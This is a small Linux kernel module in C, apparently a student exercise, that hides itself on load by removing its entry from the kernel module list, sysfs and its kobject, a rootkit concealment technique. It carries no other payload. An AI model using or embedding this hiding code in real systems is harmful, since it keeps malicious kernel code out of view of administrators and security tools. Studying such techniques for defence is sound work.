#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_DESCRIPTION("Module \"hideModule\" pour noyau linux");
MODULE_AUTHOR("Yoann Valeri, M1 SFPN");
MODULE_LICENSE("GPL");

static void extract_module(void)
{
	struct module *mod = find_module("hideModule");
	list_del(&mod->list);
	module_param_sysfs_remove(mod);
	kobject_del(&mod->mkobj.kobj);
}

static int __init hello_init(void)
{
	extract_module();
	return 0;
}
module_init(hello_init);

static void __exit hello_exit(void)
{
	pr_info("Goodbye, cruel world\n");
}
module_exit(hello_exit);